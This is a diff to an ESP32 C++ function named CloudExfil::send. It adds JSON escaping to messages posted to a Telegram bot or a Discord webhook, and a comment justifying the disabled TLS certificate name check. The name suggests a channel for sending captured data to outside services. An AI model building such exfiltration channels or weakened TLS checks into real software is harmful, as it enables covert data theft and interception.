@@ -130,19 +130,39 @@ bool CloudExfil::send(const char *message)
     char url[384];
     char postData[512];
 
+    // Escape special JSON characters in the message.
+    char escaped[256];
+    size_t ei = 0U;
+    for (size_t mi = 0U; message[mi] != '\0' && ei < sizeof(escaped) - 2U; ++mi)
+    {
+        const char ch = message[mi];
+        if (ch == '"' || ch == '\\')
+        {
+            escaped[ei++] = '\\';
+        }
+        else if (ch == '\n')
+        {
+            escaped[ei++] = '\\';
+            escaped[ei++] = 'n';
+            continue;
+        }
+        escaped[ei++] = ch;
+    }
+    escaped[ei] = '\0';
+
     if (type_ == WebhookType::TELEGRAM)
     {
         std::snprintf(url, sizeof(url),
                       "https://api.telegram.org/bot%s/sendMessage", token_);
         std::snprintf(postData, sizeof(postData),
-                      "{\"chat_id\":\"%s\",\"text\":\"%s\"}", chatId_, message);
+                      "{\"chat_id\":\"%s\",\"text\":\"%s\"}", chatId_, escaped);
     }
     else if (type_ == WebhookType::DISCORD)
     {
         std::strncpy(url, webhookUrl_, sizeof(url) - 1U);
         url[sizeof(url) - 1U] = '\0';
         std::snprintf(postData, sizeof(postData),
-                      "{\"content\":\"%s\"}", message);
+                      "{\"content\":\"%s\"}", escaped);
     }
     else
     {
@@ -153,6 +173,8 @@ bool CloudExfil::send(const char *message)
     config.url = url;
     config.method = HTTP_METHOD_POST;
     config.timeout_ms = 5000;
+    // Note: CN check disabled because ESP32 has no built-in CA bundle.
+    // For improved security, embed the specific root CA certificate.
     config.skip_cert_common_name_check = true;
 
     esp_http_client_handle_t client = esp_http_client_init(&config);
